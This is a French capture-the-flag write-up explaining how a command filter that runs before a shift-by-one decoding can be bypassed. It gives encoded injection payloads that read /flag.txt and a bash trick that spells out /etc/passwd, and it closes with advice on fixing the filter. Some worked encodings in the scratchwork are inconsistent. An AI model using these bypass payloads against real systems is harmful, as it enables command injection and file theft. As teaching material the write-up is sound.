# SOLUTION — Challenge 05 : Character Shifting

## Vulnérabilité

Le filtre analyse l'input **encodé** (avant décodage).
Un caractère dangereux après décodage peut ne pas être dangereux avant décodage.

### Table des caractères de chaînage et leurs encodages

| Char décodé | ASCII décodé | Char encodé (ascii+1) | ASCII encodé | Bloqué ? |
|-------------|--------------|----------------------|--------------|----------|
| `;`         | 59           | `<`                  | 60           | ✅ oui   |
| `\|`        | 124          | `}`                  | 125          | ✅ oui   |
| `&`         | 38           | `'`                  | 39           | ✅ oui   |
| `` ` ``     | 96           | `a`                  | 97           | ❌ **non** |
| `\n`        | 10           | `\v` (vertical tab)  | 11           | ❌ **non** |
| `$`         | 36           | `%`                  | 37           | ❌ **non** |
| `(`         | 40           | `)`                  | 41           | ✅ oui   |
| `)`         | 41           | `*`                  | 42           | ❌ **non** |

### Caractères exploitables

- **Backtick** `` ` `` (ASCII 96) : son encodé est `a` (ASCII 97) → **non filtré !**
- **Newline** `\n` (ASCII 10) : son encodé est `\v` (ASCII 11) → **non filtré !**
- **`$`** (ASCII 36) : son encodé est `%` (ASCII 37) → **non filtré !** (permet `$(...)`)
- **`)`** (ASCII 41) : son encodé est `*` (ASCII 42) → non filtré
- **`(`** (ASCII 40) : son encodé est `)` (ASCII 41) → **filtré !**

Donc on peut utiliser le backtick ou la substitution `$(...)` !

## Construction de l'exploit

### Méthode 1 : Backtick (le plus simple)

Pour exécuter : `` `cat /flag.txt` ``

Chaque caractère décalé de +1 :
```
`  → a  (96 → 97)
c  → d
a  → b
t  → u
   → ! (espace 32 → 33)
/  → 0
f  → g
l  → m
a  → b
g  → h
.  → /
t  → u
x  → y
t  → u
`  → a
```

Commande encodée : `adbu!0gmbh/uyta`

Mais attendez — on veut juste lire le flag, pas l'injecter dans une autre commande.
Le wrapper exécute directement la chaîne décodée. Donc :

```
Décodé voulu : cat /flag.txt
Encodé       : dbu!0gmbh/uyu
```

Vérifions :
- `d` → `c` ✓
- `b` → `a` ✓  
- `u` → `t` ✓
- `!` → ` ` (espace) ✓
- `0` → `/` ✓
- `g` → `f` ✓
- `m` → `l` ✓
- `b` → `a` ✓
- `h` → `g` ✓
- `/` → `.` — attendez, `/` encode `.` (ASCII 47 → 46)... 
  Non : pour produire `/` (ASCII 47), on envoie `0` (ASCII 48) ✓
- `u` → `t` ✓
- `y` → `x` ✓
- `u` → `t` ✓

Commande : `./wrapper dbu!0gmbh/uyu`

Mais `!` n'est pas filtré côté C, mais bash peut l'interpréter dans certains contextes.

### Utiliser l'outil fourni

```bash
python3 encode.py "cat /flag.txt"
# Output: dbu!0gmbh/uyu
# Hmm, ! peut causer des soucis avec l'historique bash.
# Utiliser des guillemets simples :
./wrapper 'dbu!0gmbh/uyu'
# ou
./wrapper "dbu$(echo '!')0gmbh/uyu"
```

### Méthode propre avec l'outil

```bash
# Encoder la commande voulue
python3 encode.py "cat /flag.txt"
# → dbu 0gmbh/uyu  (avec espace, pas !)

# Regardons : espace ASCII 32, encodé = chr(33) = '!'
# Éviter ! : utiliser ${IFS} à la place de l'espace dans la commande décodée
# Ou : encoder "cat${IFS}/flag.txt"... trop complexe.

# Plus simple : utiliser python3 dans la commande décodée
python3 encode.py 'python3 -c "open(\"/flag.txt\").read()"'
```

### Solution la plus directe

```bash
# Encoder : cat /flag.txt
python3 encode.py "cat /flag.txt"
# L'outil affiche la commande directement
./wrapper 'dbu!0gmbh/uyu'

# Si ! pose problème (historique bash), désactiver :
set +H
./wrapper 'dbu!0gmbh/uyu'

# Ou utiliser les guillemets doubles avec échappement :
./wrapper $'dbu\x210gmbh/uyu'
```

## Flag

```
HackUTT{4sc11_sh1ft1ng_byt3_by_byt3}
```

## Explication pédagogique

### Le principe du character shifting

Le décalage ASCII est une technique de bypass basée sur le fait que :
1. Le filtre vérifie les caractères **avant transformation**
2. La transformation modifie les valeurs ASCII
3. Des caractères inoffensifs avant transformation deviennent dangereux après

```
Filtré avant decode : input[i] ∈ forbidden ?
Exécuté après decode : output[i] = input[i] - 1
```

### Table ASCII de référence (caractères utiles)

```
32  = espace      → encoder avec chr(33) = '!'
47  = /           → encoder avec chr(48) = '0'
96  = `           → encoder avec chr(97) = 'a'  ← CLEF
10  = \n          → encoder avec chr(11) = '\v'  ← CLEF
36  = $           → encoder avec chr(37) = '%'   ← CLEF (pour $(...))
```

### L'ANSI-C Quoting : $'...' (bonus mentionné en intro)

```bash
# Bash supporte une syntaxe spéciale pour insérer des caractères par leur code :
$'\x2f'   # = '/' (hex)
$'\057'   # = '/' (octal)
$'\n'     # = newline
$'\t'     # = tab

# Exemple :
echo $'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'
# → /etc/passwd
```

Cette syntaxe permet de construire des chaînes arbitraires sans les caractères eux-mêmes.

### Protection

```c
// Filtrer APRÈS décodage, pas avant
decode(input, decoded, len);

// Puis valider la commande décodée
if (contains_dangerous_chars(decoded)) {
    printf("Commande invalide après décodage.\n");
    return 1;
}

// Et encore mieux : ne pas du tout utiliser system()
// Utiliser une whitelist de commandes autorisées
```
